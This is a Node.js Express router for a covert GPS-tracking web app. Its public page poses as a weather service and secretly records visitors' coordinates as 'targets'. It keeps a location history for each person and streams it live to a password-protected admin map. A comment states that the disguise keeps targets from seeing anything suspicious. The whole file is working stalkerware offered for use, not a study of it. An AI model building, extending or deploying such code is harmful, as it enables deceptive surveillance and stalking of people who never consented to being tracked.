const express = require("express")
const router = express.Router()
const config = require("./config")
const fs = require("fs")
const path = require("path")

const DATA_FILE = path.join(__dirname, "data.json")
const MAX_HISTORY = 500  // max GPS points stored per user

let TARGETS = {}

// Load saved TARGETS from file on startup, handle both old and new format
try {
    if (fs.existsSync(DATA_FILE)) {
        const raw = fs.readFileSync(DATA_FILE, "utf-8")
        const saved = JSON.parse(raw)
        for (const [id, val] of Object.entries(saved)) {
            // Migrate old format [lat, lng] → new format { current, history }
            if (Array.isArray(val)) {
                TARGETS[id] = { current: val, history: [val] }
            } else {
                TARGETS[id] = val
            }
        }
        console.log(`> Loaded ${Object.keys(TARGETS).length} saved target(s) from data.json`)
    }
} catch (err) {
    console.warn("> Could not load data.json, starting fresh:", err.message)
}

function saveTargets() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(TARGETS, null, 2), "utf-8")
    } catch (err) {
        console.error("> Failed to save data.json:", err.message)
    }
}

// login page
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body
    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }
    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    const isNew = TARGETS[id] == null

    if (isNew) {
        TARGETS[id] = { current: [lat, lng], history: [] }
        IO.emit("user-connected", id)
    }

    const lastPoint = TARGETS[id].history.length > 0 ? TARGETS[id].history[TARGETS[id].history.length - 1] : null;
    TARGETS[id].current = [lat, lng];
    
    // Only add to history if the location actually changed
    if (!lastPoint || lastPoint[0] !== lat || lastPoint[1] !== lng) {
        TARGETS[id].history.push([lat, lng]);
        
        // Cap history to avoid huge files
        if (TARGETS[id].history.length > MAX_HISTORY) {
            TARGETS[id].history.shift()
        }
    }

    IO.emit("map-data", { id, lat, lng })
    saveTargets()
    res.send("OK")
    console.log(`> ${id} - ${lat},${lng}`)
})

// Logout route
router.get("/logout", (req, res) => {
    res.clearCookie("token").redirect("/login")
})

// Reverse geocoding API with multi-provider fallback and landmark photos
router.get("/api/reverse-geocode", async (req, res) => {
    const lat = parseFloat(req.query.lat)
    const lng = parseFloat(req.query.lng)
    if (isNaN(lat) || isNaN(lng)) {
        return res.status(400).json({ error: "Invalid coordinates" })
    }

    let address = `${lat.toFixed(5)}, ${lng.toFixed(5)}`
    let street = ""
    let locality = ""
    let city = ""

    // 1. Primary: Photon Komoot (OpenStreetMap with detailed street & locality)
    try {
        const pRes = await fetch(`https://photon.komoot.io/reverse?lat=${lat}&lon=${lng}`, {
            headers: { "User-Agent": "GeoPulse-App/1.0" }
        })
        const pData = await pRes.json()
        if (pData.features && pData.features.length > 0) {
            const props = pData.features[0].properties
            street = props.street || props.name || ""
            locality = props.locality || props.district || ""
            city = props.city || props.county || ""
            const parts = [props.name, props.street, props.locality, props.district, props.city, props.state, props.country].filter(Boolean)
            const unique = parts.filter((item, pos, self) => self.indexOf(item) === pos)
            if (unique.length > 0) {
                address = unique.join(", ")
            }
        }
    } catch (e) {
        console.warn("> Photon geocode warning:", e.message)
    }

    // 2. Fallback: BigDataCloud free client reverse geocoder
    if (!street && !locality) {
        try {
            const bdcRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
            const bdc = await bdcRes.json()
            locality = bdc.locality || ""
            city = bdc.city || bdc.principalSubdivision || ""
            const parts = [bdc.locality, bdc.city, bdc.principalSubdivision, bdc.countryName].filter(Boolean)
            if (parts.length > 0) {
                address = parts.join(", ")
            }
        } catch (e) {
            console.warn("> BigDataCloud geocode warning:", e.message)
        }
    }

    // 3. Nearby Landmark Photo from Wikipedia
    let photo = null
    let photoTitle = null
    try {
        const wikiUrl = `https://en.wikipedia.org/w/api.php?action=query&generator=geosearch&ggscoord=${lat}|${lng}&ggsradius=3000&prop=pageimages&pithumbsize=500&format=json&origin=*`
        const wRes = await fetch(wikiUrl, { headers: { "User-Agent": "GeoPulse-App/1.0" } })
        const wData = await wRes.json()
        if (wData.query && wData.query.pages) {
            const pages = Object.values(wData.query.pages)
            const withThumb = pages.find(p => p.thumbnail)
            if (withThumb) {
                photo = withThumb.thumbnail.source
                photoTitle = withThumb.title
            }
        }
    } catch (e) {
        console.warn("> Wiki photo warning:", e.message)
    }

    res.json({
        lat,
        lng,
        address,
        street,
        locality,
        city,
        photo,
        photoTitle,
        mapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
    })
})

function renderDashboard(req, res) {
    const targetsForMap = {}
    for (const [id, val] of Object.entries(TARGETS)) {
        targetsForMap[id] = val.current || val
    }
    res.render("home", {
        TARGETS,
        targetsMapJson: JSON.stringify(targetsForMap)
    })
}

// Admin / Dashboard route - requires authentication
router.route("/admin").get((req, res) => {
    const token = req.cookies.token
    if (token != null && token === config.token) {
        renderDashboard(req, res)
    } else {
        res.redirect("/login")
    }
})

// Root URL:
// - If logged in as admin: opens Dashboard
// - If regular visitor / target: opens Weather tracker (so targets never see suspicious login!)
router.route("/").get((req, res) => {
    const token = req.cookies.token
    if (token != null && token === config.token) {
        renderDashboard(req, res)
    } else {
        res.render("weather")
    }
})

// Map page: requires admin authentication
router.route("/map").get((req, res) => {
    const token = req.cookies.token
    if (token !== config.token) {
        return res.clearCookie("token").redirect("/login")
    }
    const { id } = req.query
    const target = TARGETS[id]
    res.render("map", {
        data: target ? target.current : [0, 0],
        historyJson: JSON.stringify(target ? target.history : [])
    })
})

module.exports = router